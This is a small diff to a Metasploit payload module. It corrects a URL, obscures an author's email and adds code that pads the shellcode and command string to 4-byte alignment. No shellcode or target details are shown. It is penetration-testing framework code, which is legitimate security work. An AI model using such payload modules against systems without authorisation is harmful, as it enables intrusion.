@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -19,7 +19,7 @@ module Metasploit3
          },
       'Author'        =>
         [
-          'Michael Messner <devnull@s3cur1ty.de>', #metasploit payload
+          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
           'entropy@phiral.net'  #original payload
         ],
       'References'    =>
@@ -66,7 +66,13 @@ module Metasploit3
     #
     # Constructs the payload
     #
-    return super + shellcode + command_string + "\x00"
+
+    shellcode = shellcode + command_string + "\x00"
+
+    # we need to align our shellcode to 4 bytes
+    (shellcode = shellcode + "\x00") while shellcode.length%4 != 0
+
+    return super + shellcode
 
   end
 
